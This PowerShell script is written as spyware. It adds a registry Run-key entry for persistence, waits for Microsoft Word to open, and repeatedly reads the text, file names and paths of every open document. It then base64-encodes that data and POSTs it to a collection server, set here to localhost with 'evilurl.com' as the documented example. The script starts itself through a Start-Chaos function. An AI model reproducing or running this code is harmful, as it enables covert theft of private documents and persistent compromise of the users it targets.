$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$ServerURL = "http://localhost:8080"
$Process = "Winword"


function Set-RegistryPersistence {
<#
.SYNOPSIS
Enables persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name to configure the entry in the registry.
.PARAMETER Command
Indicates the command to run in the startup when user log in.
.EXAMPLE
Set-RegistryPersistence -Name "EntryName" -Command "ScriptToExecute"
#>

    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    New-ItemProperty -Path $RegistryPath -Name $Name -Value $Command -PropertyType String -Force | Out-Null
     
}

function Remove-RegistryPersistence {
<#
.SYNOPSIS
Remove persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name of the registry entry to delete.
.EXAMPLE
Remove-LocalSecurityPolicy -Name "EntryToDelete".
#>

    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    Remove-ItemProperty -Path $RegistryPath -Name $Name -Force | Out-Null
     
}


function Get-OpenWORDDocumentsWords {
<#
.SYNOPSIS
Retrieve all WinWords open documents, get the title, the document path and exfiltrates all written words in base64
.EXAMPLE
Get-OpenWordDocumentsWords -URL "http://evilurl.com"
.PARAMETER URL
Indicates the URL of the server to exfiltrate the data.
#>
    
    Param (       
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $URL
    )

    try {
        $WordDocuments = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
    }
    catch {
    }
    finally {
        foreach ($WordDoc in $WordDocuments.Documents) {
            
            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $WordDoc.Name + "`n" + "Document_path: " + $WordDoc.FullName + "`n" + "Words: "
                    
            foreach ($Word in $WordDoc.Words) {
                if ($null -ne $Word.Text){
                    #clear non ascii chars
                    $Exfil += $Word.Text -replace '[^\x30-\x39\x41-\x5A\x61-\x7A]+', ''
                    $Exfil += " "
                }                
            }

            $Exfil += "`n" + "##-END-##"
            $b  = [System.Text.Encoding]::UTF8.GetBytes($Exfil)
            $EncodedData = [System.Convert]::ToBase64String($b)
            Invoke-Request -URL $URL -Body $EncodedData | Out-Null
        }
    }

    try {
        [Runtime.Interopservices.Marshal]::ReleaseComObject('Word.Application')
    }
    catch {
    }

}


function Invoke-Request {
<#
.SYNOPSIS
Make a POST Request to specified URL to exifltrate data.
.PARAMETER URL
Indicates the URL of the server to make the request.
.PARAMETER Body
Indicates the body of the request
.EXAMPLE
Invoke-Request -URL "ServerURL".
#>

    Param (
                        
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $URL,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Body

    )

    try {
        Invoke-WebRequest -Method 'Post' -Uri $URL -Body $Body
    }
    catch{
    }

}


function Wait-ProccessStarts {
<#
.SYNOPSIS
Wait until Get-Process returns a value for the indicated process name.
.PARAMETER Process
Indicates the process to check in Get-Process cmdlet.
.EXAMPLE
Wait-ProcessStarts -Process "ProcessName"
#>
    
    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Process
    )

    do {
        $Proc = Get-Process $Process -ErrorAction SilentlyContinue
        # Sleep 5 secs to not overload CPU
        Start-Sleep 1
    } until ($Null -ne $Proc)
    
    Wait-ProccessStops -Process $Process

}


function Wait-ProccessStops {
<#
.SYNOPSIS
Wait until Get-Process returns a $null value for the indicated process name.
.PARAMETER Process
Indicates the process to check in Get-Process cmdlet.
.EXAMPLE
Wait-ProcessStops -Process "ProcessName"
#>
        
    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Process
    )

    do {
        $Proc = Get-Process $Process -ErrorAction SilentlyContinue
        # Sleep 60 sec to not overload CPU and exfiltrate documents with this time interval
        Start-Sleep 5
        # Execute the exiltration
        Get-OpenWordDocumentsWords -URL $ServerURL
    } until($Null -eq $Proc)

    Wait-ProccessStarts -Process $Process
    
}

function Start-Chaos {

    Set-RegistryPersistence -Name "test" -Command "powershell.exe"
    Wait-ProccessStarts -Process $Process

}

Start-Chaos